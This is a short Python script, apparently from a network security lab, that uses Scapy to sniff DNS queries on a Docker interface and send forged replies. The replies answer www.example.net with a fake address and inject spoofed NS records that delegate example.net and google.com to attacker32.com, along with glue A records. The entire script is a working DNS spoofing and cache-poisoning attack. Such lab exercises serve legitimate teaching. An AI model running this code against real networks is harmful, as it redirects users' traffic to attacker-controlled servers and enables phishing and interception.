from scapy.all import *

def spoof_dns(pkt):
#   pkt.show()
  print(pkt[DNS].qd.qname)
  if(DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=259200, rdata='10.0.0.1')

    # The Authority Section
    NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='attacker32.com')

    # The Additional Section
    Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='attacker32.cn', type='A', ttl=259200, rdata='5.6.7.8')

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53 and src host 172.17.0.2', prn=spoof_dns, iface="docker0")
